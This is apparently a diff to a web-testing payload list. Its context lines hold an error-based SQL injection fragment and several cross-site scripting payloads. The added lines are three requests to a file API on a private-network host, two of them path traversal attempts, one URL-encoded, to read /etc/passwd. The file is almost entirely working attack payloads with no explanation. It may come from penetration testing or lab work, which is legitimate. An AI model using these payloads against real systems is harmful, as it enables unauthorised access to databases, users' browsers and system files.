@@ -40,3 +40,7 @@ AND UPDATEXML(1, CONCAT(0x5c, version()), 1)
 <img/src=x/onerror=alert(1)>
 <img src="x" onerror="alert(1)">
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>
+
+http://192.168.122.109:5000/api/file?filename=photo.jpeg
+http://192.168.122.109:5000/api/file?filename=../../../../../../../../../../../../etc/passwd
+http://192.168.122.109:5000/api/file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
